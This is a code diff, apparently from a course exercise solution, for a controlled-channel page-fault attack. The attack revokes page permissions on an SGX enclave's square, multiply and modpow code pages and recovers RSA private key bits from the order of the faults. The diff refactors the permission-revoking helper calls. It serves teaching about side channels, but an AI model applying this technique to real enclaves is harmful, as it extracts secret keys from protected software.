@@ -28,8 +28,6 @@ sgx_enclave_id_t create_enclave(void)
 int fault_fired = 0;
 void *sq_pt = NULL, *mul_pt = NULL, *modpow_pt = NULL;
 
-uint64_t *pte_sq, *pte_modpow, *pte_mul;
-
 enum pf_state
 {
     MODPOW = 0,
@@ -66,12 +64,12 @@ void fault_handler(size_t pagenum)
 
         state = SQ;
 
-        pte_removeperms(pte_modpow);
+        pte_revoke_pages(virt_to_pagenum(modpow_pt), 1);
     }
     else if (base_adrs == mul_pt)
     {
         state = MUL;
-        pte_removeperms(pte_modpow);
+        pte_revoke_pages(virt_to_pagenum(modpow_pt), 1);
 
         /* Detected 1 bit */
         key |= mask;
@@ -79,16 +77,15 @@ void fault_handler(size_t pagenum)
     else if (base_adrs == modpow_pt)
     {
         state = MODPOW;
-        pte_removeperms(pte_sq);
-        pte_removeperms(pte_mul);
+        pte_revoke_pages(virt_to_pagenum(sq_pt), 1);
+        pte_revoke_pages(virt_to_pagenum(mul_pt), 1);
     }
     else
     {
         info("#PF state machine in unknown state! :/");
         abort();
     }
-
-    pte_restoreperms(get_pte_by_address(base_adrs));
+    pte_restore_pages(pagenum, 1);
 
     fault_fired++;
 }
@@ -116,14 +113,7 @@ int main(int argc, char **argv)
     info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);
 
     /* =========================== START SOLUTION =========================== */
-    // Remove access, equivalent to PROT_NONE (However prot_none unmaps the page, does inversion and stuff on top)
-    ASSERT(pte_sq = get_pte_by_address(sq_pt));
-    ASSERT(pte_mul = get_pte_by_address(mul_pt));
-    ASSERT(pte_modpow = get_pte_by_address(modpow_pt));
-    info("REMAPPING: square_pte at %p; muliply_pte at %p; modpow_pte at %p", pte_sq, pte_mul, pte_modpow);
-
-    pte_removeperms(get_pte_by_address(sq_pt));
-
+    pte_revoke_pages(virt_to_pagenum(sq_pt), 1);
     /* =========================== END SOLUTION =========================== */
 
     SGX_ASSERT(ecall_rsa_decode(eid, &plain, cipher));
